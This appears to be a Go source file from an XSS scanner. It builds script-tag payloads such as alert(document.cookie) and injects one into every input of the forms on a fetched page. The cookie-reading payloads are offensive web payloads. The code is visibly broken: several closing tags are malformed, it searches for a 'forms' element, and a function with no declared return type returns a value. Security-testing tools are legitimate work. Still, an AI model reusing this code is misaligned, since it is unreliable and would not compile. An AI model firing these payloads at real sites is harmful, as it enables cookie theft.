package handlers

import (
	"log"

	"github.com/anaskhan96/soup"
	"github.com/xtasysensei/vultest/cmd/utils"
)

func GeneratePayload(eff int) (string, error) {
	payloads := []string{
		"prompt(5000/200)",
		"alert(6000/3000)",
		"alert(document.cookie)",
		"prompt(document.cookie)",
		"console.log(5000/3000)",
	}

	if eff == 1 {
		return "<script/>" + payloads[utils.RandRange(0, 4)] + `<\script\>`, nil
	} else if eff == 2 {
		return `<\script/>` + payloads[utils.RandRange(0, 4)] + `<\\script>`, nil

	} else if eff == 3 {
		return `<\script\>` + payloads[utils.RandRange(0, 4)] + `<//script>`, nil
	} else if eff == 4 {
		return `<script>` + payloads[utils.RandRange(0, 4)] + `<\script/>`, nil

	} else if eff == 5 {
		return `<script>` + payloads[utils.RandRange(0, 4)] + `<//script>`, nil

	} else if eff == 6 {
		return `<script>` + payloads[utils.RandRange(0, 4)] + `</script>`, nil

	}

	return "", nil
}

type Keys struct {
	KeyType string
	KeyName string
}

func GetFormMethod(url string, payload string) {
	resp, err := soup.Get(url)
	if err != nil {
		log.Fatalf("error connection to url %s: %v", url, err)
	}
	doc := soup.HTMLParse(resp)
	forms := doc.FindAll("forms")
	for _, form := range forms {
		action := form.Attrs()["action"]
		method := form.Attrs()["method"]
		if method == "post" {
			utils.Warning("Target have form with POST method: " +
				utils.C + url + "/" + action)
			utils.Info("Collecting form input key.....")
		}
		var keys []Keys
		inputAreas := form.FindAll("input", "textarea")
		for _, inputArea := range inputAreas {
			keyType := inputArea.Attrs()["type"]
			keyName := inputArea.Attrs()["name"]
			if keyType == "submit" {
				utils.Info("Form key name: " + utils.G + keyName + utils.N + " value: " + utils.G + "<Submit Confirm>")
				key := Keys{
					KeyType: keyType,
					KeyName: keyName,
				}
				keys = append(keys, key)

			} else {
				utils.Info("Form key name: " + utils.G +
					keyName + utils.N + " value: " + utils.G + payload)
				key := Keys{
					KeyType: keyType,
					KeyName: payload,
				}
				keys = append(keys, key)
			}
			return keys
		}
	}
}
